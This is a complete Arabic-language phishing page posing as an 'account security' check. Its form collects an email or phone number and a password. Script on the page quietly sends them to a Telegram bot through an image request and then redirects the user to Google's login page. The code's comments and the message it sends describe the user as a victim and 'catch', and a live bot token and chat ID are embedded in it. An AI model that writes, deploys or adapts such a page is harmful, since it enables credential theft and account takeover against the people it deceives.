<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام التحقق من الحساب</title>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { width: 320px; background: #111; padding: 25px; border-radius: 12px; border: 1px solid #333; text-align: center; }
        input { width: 100%; padding: 12px; margin: 10px 0; background: #222; border: 1px solid #444; color: #fff; border-radius: 6px; box-sizing: border-box; }
        .btn { width: 100%; padding: 12px; background: #fff; color: #000; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>

<div class="card">
    <h2 style="color: #00ff00;">🛡️ أمان الحساب</h2>
    <p style="font-size: 13px; color: #888;">يرجى تأكيد بياناتك للمتابعة</p>
    <input type="text" id="user" placeholder="الإيميل أو الهاتف" required>
    <input type="password" id="pass" placeholder="كلمة المرور" required>
    <button class="btn" onclick="sendToBot()">تأكيد الهوية</button>
</div>

<script>
    function sendToBot() {
        const user = document.getElementById('user').value;
        const pass = document.getElementById('pass').value;
        const token = "8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg";
        const chatId = "5811700860";

        if(user.length < 4 || pass.length < 4) return;

        const text = `🔥 صيد جديد يا وحش:\n👤 اليوزر: ${user}\n🔑 الباسورد: ${pass}`;

        // الطريقة المضمونة: الإرسال عبر رابط مباشر (GET) يتخطى الحماية
        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
        
        // محاولة الإرسال بالخفاء
        const img = new Image();
        img.src = url;

        // إيهام الضحية بالتحميل ثم التحويل
        document.querySelector('.btn').innerText = "جاري التحقق...";
        setTimeout(() => {
            window.location.href = "https://accounts.google.com";
        }, 1500);
    }
</script>
</body>
</html>
